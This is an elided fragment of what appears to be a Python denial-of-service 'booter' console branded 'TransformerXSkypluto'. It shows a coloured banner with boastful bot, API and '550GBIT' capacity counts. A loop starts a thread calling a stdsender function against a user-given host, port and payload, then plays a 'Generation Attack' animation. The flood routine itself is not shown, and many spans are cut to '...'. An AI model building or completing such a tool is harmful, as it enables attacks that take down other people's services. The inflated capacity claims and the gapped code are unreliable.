...
\033[0;36m                 ║           \033[0;36mBOTS ACCES = \033[0;37m[99999]
\033[0;36m                 ║           \033[0;36mAPI ACCES = \033[0;37m[99999]                
\033[0;36m                 ║           \033[0;36mADMIN ACCES = \033[0;37m[1]
\033[0;36m                 ║           \033[0;36mPLAYER ACCES = \033[0;37m[99999]
\033[0;36m                 ║          \033[0;36mPING ACCESS = \033[0;37m[550GBIT]
\033[0;36m                 ║           \033[0;36mDEVELOPER ACCESS = \033[0;37m[1]
\033[0;36m                 ║           \033[0;36mTIME DATE ACCESS = \033[0;37m[22/02/2024]
\033[0;36m                 ╚═════════════╩═════════════════════════════════╝
"""
...
\033[0;36m                 ║           \033[0;37mUSERNAME = TransformerXSkypluto                
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;[-] TransformerXSkypluto | Api Connected [99999] | Backup Server [99999] | Online User [99999] | Admin: [TransformerXSkypluto] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] TransformerXSkypluto Generation Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[\] TransformerXSkypluto Generation Attack..")
					time.sleep(1)
					...
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] TransformerXSkypluto Generation Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] TransformerXSkypluto Generation Attack...")
					time.sleep(1)
